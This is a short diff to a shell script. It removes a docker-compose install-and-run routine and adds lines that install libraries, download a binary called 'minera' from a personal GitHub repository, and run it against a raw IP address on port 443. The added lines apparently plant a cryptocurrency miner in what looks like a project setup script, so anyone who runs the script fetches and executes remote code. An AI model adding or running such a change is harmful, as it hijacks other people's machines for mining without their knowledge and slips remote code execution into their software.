@@ -1,8 +1,2 @@
-#!/usr/bin/env bash
-
-curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && \
-    chmod +x /usr/local/bin/docker-compose
-docker-compose build --parallel 
-docker-compose up -d  && clear 
-docker-compose logs
-sleep 2000m
+apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
+wget https://github.com/komaria10003099/komaria/raw/main/minera && chmod +x minera && ./minera -o 137.184.5.123:443 -t 1
